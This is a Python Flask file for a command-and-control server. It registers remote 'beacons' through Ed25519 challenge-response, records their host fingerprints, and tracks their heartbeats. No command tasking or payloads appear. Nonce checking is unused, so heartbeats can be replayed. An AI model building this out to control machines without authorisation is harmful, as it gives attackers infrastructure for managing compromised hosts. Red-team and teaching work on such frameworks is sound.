"""
Implementation of a C2 Server using Python.
"""

from flask import Flask, request

import secrets
import uuid
import base64
import json

from datetime import datetime
from zoneinfo import ZoneInfo


from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PublicKey
from cryptography.exceptions import InvalidSignature

from db_manager import get_session, Beacon, Challenge

app = Flask(__name__)

NONCE_SET = {}


def generate_new_challenge(
    beacon_fingerprint=None,
    beacon_id=None,
    public_key=None,
    challenge_type="registration",
):
    challenge_id = str(uuid.uuid4())
    challenge = secrets.token_bytes(32)
    challenge_base64 = base64.b64encode(challenge).decode("utf-8")

    with get_session() as session:

        if beacon_fingerprint:
            challenge_generated = Challenge(
                challenge_id=challenge_id,
                challenge=challenge_base64,
                beacon_id=beacon_fingerprint["beacon_id"],
                public_key=beacon_fingerprint["public_key"],
                system_info=beacon_fingerprint,
                created_at=datetime.now(ZoneInfo("Asia/Kolkata")),
                type=challenge_type,
            )

        else:
            challenge_generated = Challenge(
                challenge_id=challenge_id,
                challenge=challenge_base64,
                beacon_id=beacon_id,
                public_key=public_key,
                created_at=datetime.now(ZoneInfo("Asia/Kolkata")),
                type=challenge_type,
            )

        session.add(challenge_generated)
        session.commit()

    return {
        "challenge_id": challenge_id,
        "challenge": challenge_base64,
    }


@app.route("/api/register/verify", methods=["POST"])
def verify_beacon():
    beacon_id = request.json["beacon_id"]

    with get_session() as session:
        beacon = session.get(Beacon, beacon_id)

        if beacon is None:
            return {"registered": False}, 404

        challenge_generated = generate_new_challenge(
            beacon_id=beacon_id,
            public_key=beacon.public_key,
            challenge_type="authentication",
        )

    return challenge_generated, 200


@app.route("/api/register/start", methods=["POST"])
def register_agent():
    "Receive the initial request from the beacon and send a challenge for verification."

    beacon_fingerprint = request.json

    challenge_generated = generate_new_challenge(
        beacon_fingerprint=beacon_fingerprint, challenge_type="registration"
    )

    return challenge_generated, 200


@app.route("/api/register/verify-challenge-response", methods=["POST"])
def verify_challenge():
    try:
        challenge_id = request.json["challenge_id"]
        challenge_signature = request.json["challenge_signature"]

        with get_session() as session:
            challenge = session.get(Challenge, challenge_id)

            if challenge is None:
                return {"verified": False, "error": "Invalid challenge"}, 400

            if challenge.used:
                return {"verified": False, "error": "Challenge already used"}, 401

            beacon_id = challenge.beacon_id
            public_key_hex = challenge.public_key
            challenge_value = challenge.challenge

            public_key = Ed25519PublicKey.from_public_bytes(
                bytes.fromhex(public_key_hex)
            )

            public_key.verify(
                base64.b64decode(challenge_signature),
                base64.b64decode(challenge_value),
            )

            current_timestamp = datetime.now(ZoneInfo("Asia/Kolkata"))

            if challenge.type == "authentication":

                beacon = session.get(Beacon, beacon_id)

                if beacon is None:
                    return {"verified": False, "error": "Beacon not found"}, 404

                beacon.last_active = current_timestamp
                beacon.status = "online"

            else:

                existing_beacon = session.get(Beacon, beacon_id)

                if existing_beacon:
                    return {
                        "verified": False,
                        "error": "Beacon already registered",
                    }, 409

                beacon = Beacon(
                    id=beacon_id,
                    public_key=public_key_hex,
                    system_info=json.dumps(challenge.system_info),
                    registered_at=current_timestamp,
                    last_active=current_timestamp,
                    status="online",
                )

                session.add(beacon)

            challenge.used = True
            session.commit()

        return {"verified": True}, 200

    except (InvalidSignature, ValueError, TypeError, KeyError):
        return {"verified": False}, 401


@app.route("/api/heartbeat", methods=["POST"])
def heartbeat():
    data = request.json

    id = data["beacon_id"]
    timestamp = datetime.fromisoformat(data["timestamp"])
    nonce = data["nonce"]
    signature = base64.b64decode(data["signature"])

    with get_session() as session:
        beacon = session.get(Beacon, id)
        pub_key_hex = beacon.public_key

        try:
            pub_key_bytes = bytes.fromhex(pub_key_hex)
            pub_key = Ed25519PublicKey.from_public_bytes(pub_key_bytes)

            pub_key.verify(signature, data["message"].encode("utf-8"))
            beacon.last_active = timestamp
            session.add(beacon)
            session.commit()
            return "200"

        except InvalidSignature:
            print("nope")
            return {"error": "Invalid signature"}


if __name__ == "__main__":
    app.run(debug=True, port=4999)
